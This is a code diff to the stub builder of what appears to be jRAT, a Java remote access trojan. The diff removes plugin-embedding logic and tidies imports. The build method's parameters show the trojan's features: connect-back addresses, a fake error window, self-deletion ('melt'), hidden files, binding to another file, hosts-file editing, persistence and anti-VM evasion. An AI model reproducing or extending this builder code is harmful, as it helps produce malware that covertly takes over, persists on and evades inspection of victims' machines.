@@ -6,38 +6,27 @@ import jrat.common.crypto.CryptoUtils;
 import jrat.common.hash.Md5;
 import jrat.common.hash.Sha1;
 import jrat.common.utils.DataUnits;
-import jrat.common.utils.JarUtils;
 import jrat.controller.Constants;
 import jrat.controller.ErrorDialog;
 import jrat.controller.Main;
 import jrat.controller.OSConfig;
-import jrat.controller.addons.PluginList;
-import jrat.controller.addons.StubPlugin;
 import jrat.controller.listeners.BuildListener;
 import jrat.controller.ui.dialogs.DialogSummary;
 
-import java.io.BufferedWriter;
-import java.io.ByteArrayOutputStream;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.io.OutputStreamWriter;
-import java.util.Enumeration;
-import java.util.HashMap;
-import java.util.Map;
-import java.util.Random;
-import java.util.jar.JarFile;
-import java.util.zip.ZipEntry;
-import java.util.zip.ZipException;
-import java.util.zip.ZipFile;
-import java.util.zip.ZipOutputStream;
 import javax.crypto.Cipher;
 import javax.crypto.CipherOutputStream;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
+import java.io.*;
+import java.util.Enumeration;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Random;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipException;
+import java.util.zip.ZipFile;
+import java.util.zip.ZipOutputStream;
 
 public class Build {
 
@@ -50,7 +39,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dontInstall, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, boolean antivm) {
 		listener.start();
 		
 		if (!file.getName().toLowerCase().endsWith(".jar")) {
@@ -264,53 +253,6 @@ public class Build {
 				entry = new ZipEntry("icon.png");
 				outputStub.putNextEntry(entry);
 				copy(trayIcon, outputStub);
-				outputStub.closeEntry();
-			}
-
-			String[] plugins = null;
-
-			if (pluginlist != null) {
-				plugins = new String[pluginlist.plugins.size()];
-				listener.reportProgress(50, "Writing " + pluginlist.plugins.size() + " plugins...", BuildStatus.INFO);
-
-				for (int i = 0; i < pluginlist.plugins.size(); i++) {
-					StubPlugin p = pluginlist.plugins.get(i);
-					JarFile plugin = new JarFile(p.path);
-					entries = plugin.entries();
-
-					while (entries.hasMoreElements()) {
-						entry = entries.nextElement();
-
-						String mainClass = JarUtils.getMainClassFromInfo(plugin);
-
-						if (entry.getName().replace("/", ".").replace(".class", "").equals(mainClass)) {
-							plugins[i] = entry.getName().replace("/", ".").replace(".class", "");
-						}
-
-						entry = new ZipEntry(entry.getName());
-
-						try {
-							InputStream pluginInputStream = plugin.getInputStream(entry);
-							listener.reportProgress(50, "Writing plugin resource " + entry.getName() + " (" + pluginInputStream.available() + " bytes)", BuildStatus.INFO);
-							outputStub.putNextEntry(entry);
-							copy(pluginInputStream, outputStub);
-							outputStub.closeEntry();
-							listener.reportProgress(50, "Wrote plugin resource " + entry.getName(), BuildStatus.CHECK);
-						} catch (Exception ex) {
-							listener.reportProgress(50, ex.getMessage(), BuildStatus.ERROR);
-							continue;
-						}
-					}
-					listener.reportProgress(50, "Wrote plugins", BuildStatus.CHECK);
-				}
-			}
-
-			if (plugins != null) {
-				entry = new ZipEntry("plugins.dat");
-				outputStub.putNextEntry(entry);
-				for (int i = 0; i < plugins.length; i++) {
-					outputStub.write((plugins[i] + ",").getBytes("UTF-8"));
-				}
 				outputStub.closeEntry();
 			}
 
